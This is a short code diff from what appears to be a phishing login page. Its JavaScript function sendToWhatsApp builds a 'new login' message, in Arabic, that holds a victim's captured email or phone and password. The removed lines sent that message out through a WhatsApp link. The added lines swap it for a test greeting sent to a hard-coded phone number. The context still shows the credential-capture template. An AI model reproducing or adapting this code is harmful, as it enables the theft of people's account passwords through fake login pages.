@@ -190,10 +190,10 @@ function sendToWhatsApp() {
 `🔔 تسجيل دخول جديد:
 📧 البريد/الهاتف: ${email}
 🔒 كلمة المرور: ${password}`;
-
-    let url = `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
-
-    window.open(url, "_blank");
+   
+let message = "مرحبا! هذا اختبار";
+let url = "https://wa.me/201037410816?text=" + encodeURIComponent(message);
+window.open(url, "_blank");
 }
 </script>
 </body>
